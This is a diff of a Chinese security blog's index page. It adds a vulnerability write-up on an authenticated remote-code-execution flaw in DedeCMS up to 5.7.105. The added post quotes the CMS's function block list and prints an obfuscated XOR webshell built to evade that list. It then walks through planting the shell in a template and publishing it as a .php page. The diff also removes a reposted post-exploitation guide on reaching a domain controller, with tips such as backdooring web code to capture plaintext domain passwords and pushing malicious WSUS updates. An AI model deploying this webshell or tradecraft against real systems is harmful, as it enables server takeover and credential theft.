@@ -255,6 +255,105 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/" class="post-title-link" itemprop="url">【漏洞分析】织梦后台rce <=dedecms v5.7.105</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-07 21:16:16 / 修改时间：21:16:53" itemprop="dateCreated datePublished" datetime="2023-03-07T21:16:16+08:00">2023-03-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="【漏洞分析】织梦后台rce-lt-dedecms-v5-7-105"><a href="#【漏洞分析】织梦后台rce-lt-dedecms-v5-7-105" class="headerlink" title="【漏洞分析】织梦后台rce &lt;=dedecms v5.7.105"></a>【漏洞分析】织梦后台rce &lt;=dedecms v5.7.105</h1><h1 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h1><p><a target="_blank" rel="noopener" href="https://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7.105-UTF8.zip">https://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7.105-UTF8.zip</a></p>
+<p>原本官网是没有这个版本了，但是改一下url就可以找到历史版本。</p>
+<p>受影响的版本 &lt;=dedecms v5.7.105</p>
+<p>我们这里找到dedecms v5.7.105进行分析</p>
+<p>至于环境搭建。</p>
+<p>下载下来之后放到phpstudy上面就可以了</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞出现的文件在<code>uploads/dede/templets_one_edit.php</code></p>
+<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230306182541957.png" alt="image-20230306182541957"></p>
+<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230306182549540.png" alt="image-20230306182549540"></p>
+<p>找到漏洞点</p>
+<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230306185621108.png" alt="image-20230306185621108"></p>
+<p>在这里正则匹配了用户的文件名之后，没有对文件名的合法性进行检测，导致了攻击者可以创建任意类型文件，从而getshell。但是这里需要引用模板，而出创建模板文件的地方存在安全过滤，路径如下<code>\uploads\dede\tpl.php</code></p>
+<p>其过滤代码大概如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不允许这些字符</span></span><br><span class="line"><span class="variable">$content</span> = preg_replace(<span class="string">&quot;#(/\*)[\s\S]*(\*/)#i&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$cfg_disable_funs</span>;</span><br><span class="line"><span class="variable">$cfg_disable_funs</span> = <span class="keyword">isset</span>(<span class="variable">$cfg_disable_funs</span>) ? <span class="variable">$cfg_disable_funs</span> : <span class="string">&#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace&#x27;</span>;</span><br><span class="line"><span class="variable">$cfg_disable_funs</span> = <span class="variable">$cfg_disable_funs</span>.<span class="string">&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (explode(<span class="string">&quot;,&quot;</span>, <span class="variable">$cfg_disable_funs</span>) <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$value</span> = str_replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>) &amp;&amp; preg_match(<span class="string">&quot;#[^a-z]+[&#x27;\&quot;]*<span class="subst">&#123;$value&#125;</span>[&#x27;\&quot;]*[\s]*[([&#123;]#i&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span> = dede_htmlspecialchars(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span> = dede_htmlspecialchars(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span> = dede_htmlspecialchars(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;#[`][\s\S]*[`]#i&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span> = dede_htmlspecialchars(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>好难绕啊，但是在tools发现了一个马给绕过去了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>  @(<span class="string">&quot;Y;HJ(Z&quot;</span>^<span class="string">&quot;8H;/Z.&quot;</span>)($&#123;<span class="string">&quot;~?&#125;$&quot;</span>^<span class="string">&quot;!x8p&quot;</span>&#125;[<span class="number">1</span>]);<span class="comment">//密码是1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230307211254494.png" alt="image-20230307211254494"></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先进入默认模板管理，新建一个模板</p>
+<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212053856.png" alt="image-20230305212053856"></p>
+<p>然后创建一个模板，内容需要免杀的shell，要不然利用不了（分析的地方写了</p>
+<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212157094.png" alt="image-20230305212157094"></p>
+<p>命名为78.htm</p>
+<p>随后来到核心-但也文档管理</p>
+<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212245028.png" alt="image-20230305212245028"></p>
+<p>创建一个页面，引用刚刚创建的78模板，然后文件名的后缀名改成php</p>
+<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212316773.png" alt="image-20230305212316773"></p>
+<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212343348.png" alt="image-20230305212343348"></p>
+<p>来到目录<code>/uploads/a/newfile1.php</code></p>
+<p>即可看到模板中的恶意代码成功执行</p>
+<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212444451.png" alt="image-20230305212444451"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -642,95 +741,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/02/19/%E9%80%9A%E8%BF%87linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91%E5%90%8E%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BE%BE%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/19/%E9%80%9A%E8%BF%87linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91%E5%90%8E%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BE%BE%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">通过linux服务器进入内网后如何快速达到域控的思路总结</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-02-19 13:12:01 / 修改时间：13:12:24" itemprop="dateCreated datePublished" datetime="2023-02-19T13:12:01+08:00">2023-02-19</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="通过linux服务器进入内网后如何快速达到域控的思路总结"><a href="#通过linux服务器进入内网后如何快速达到域控的思路总结" class="headerlink" title="通过linux服务器进入内网后如何快速达到域控的思路总结"></a><strong>通过linux服务器进入内网后如何快速达到域控的思路总结</strong></h1><p>此文章为转发，方便日后查阅。</p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv20125695">通过linux服务器进入内网后如何快速达到域控的思路总结 - 哔哩哔哩 (bilibili.com)</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux服务器的resolve.conf 中dns可能会设置为域控</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查/etc/krb5.conf  </span><br><span class="line"></span><br><span class="line">Azure 中的vm可以通过配置kerberos将vm加入托管域，使Azure AD域账户通过ssh登录linux服务器</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查smb.conf / 查mnt cifs挂载</span><br><span class="line"></span><br><span class="line">linux 主机连接windows 445 smb共享文件夹有两种方式，一种是通过samba-client客户端，一种是通过mount cifs去挂载共享文件夹的cifs文件系统，可以查看samba-client 的配置文件，或者查看.bash_history查看连接历史，这里连接的大概率不是域控主机，但可能是域内的nas或域内的服务器，小概率会是开发的测试机，不管怎么样，都离我们的目标更近了一步，而且nas里面有敏感信息正常吗，很正常啊</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">找ad登录验证的web服务器</span><br><span class="line"></span><br><span class="line">在大型组织的内网，很可能存在通过域进行身份验证的服务器，包括但不限于通过ad账号验证的erp、crm系统、邮箱系统或域账号管控系统，通过web端口扫描找到对应的服务器并尝试对web系统、数据库弱口令等各种姿势去getshell，在进入内网后的众多web系统中可以提高对他的渗透优先级</span><br><span class="line"></span><br><span class="line">拿到后可以在web源码或配置文件中找到ad服务器的ip端口等信息，如果数据库保存了账号密码明文很好，但大概率是加密后的账号密码，可以改源码加个后门把域账号密码明文保存下来</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">找ad账号验证的vdi管控或登录系统（Crtrix ADC、Vcenter、国内某些厂商的VDI管控平台等等）</span><br><span class="line"></span><br><span class="line">这里的vdi系统其实也是套web系统，但因为这些网络设备如果是登录系统拿到shell权限后大概率会跨网段进入域控和vdi主机所在的网段，如果是管控系统的话，如果都是vdi主机组的域，那基本就结束了，所以单独拿出来说一下。拿到对应的服务器权限后一般都会有一个本地与域控服务器通信的域控账号将设备注册到域控中，密码不出意外都是加密的，这里吹一波msf，在cs烂大街的情况下，还是有一堆痴心不改的老外愿意把这些关键设备的配置文件解密脚本更新到msf的插件中</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">找WSUS服务器/EDR终端管控服务器/SCCM服务器</span><br><span class="line"></span><br><span class="line">WSUS就是windows推送更新补丁包的服务器，拿到之后可以给域控分发补丁（exe或恶意命令）然后打域控，当然不是扫135看到WSUS就一定有域，这玩意也能放到工作组里用</span><br><span class="line"></span><br><span class="line">SCCM是 Microsoft 的一种解决方案，可在整个组织中以可扩展的方式增强管理。SCCM 允许大量功能，包括将 PowerShell 脚本推送到其客户端、将命令推送到其客户端、在客户端上打开远程终端会话、在其客户端上安装软件、更改其客户端上的策略等等。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano/cat /var/log/secure</span><br><span class="line"></span><br><span class="line">emm...如果拿到内网web系统，查下端口访问，可能能看到办公机访问的ip或办公网网关ip，对所在网段389或636,3268,3269（GC服务）端口扫描可能会有收获</span><br><span class="line"></span><br><span class="line">查看ssh连接历史的ip也是一个意思，快速定位可达windows主机的IP段，尽量少在内网大的网段扫描探测</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">135端口扫描</span><br><span class="line"></span><br><span class="line">OXID find是yyds啦</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openvpn配置文件</span><br><span class="line"></span><br><span class="line">适用的环境比较奇怪，现在的云主机比较多嘛，有时候源码在内网的gitlab上，或者有些其他需要与内网资源交互的奇特场景，会给服务器上配个vpn，拿到账号密码ip端口就去连内网去搞内网渗透去了，像vpn账号嘛、邮箱账号嘛、sso账号嘛和域控账号密码一毛一样很正常嘛，如果能在主机上能翻到ADFS sso账号简直中奖好嘛，这一块主要看操作的人在主机上留了什么东西了</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gitlab信息收集</span><br><span class="line"></span><br><span class="line">就像前面说的内网存在一些需要ad验证的web系统，如果拿到gitlab之类的源码平台搜索关键字ldap在源码中、注释中可能会找到测试的ad账号和服务器地址，如果最新的版本中找不到，记得在老的commit中翻一下，git系统的位置可以在拿到权限的服务器源码的.git的config之类的配置文件中找</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -802,7 +812,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-count">174</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
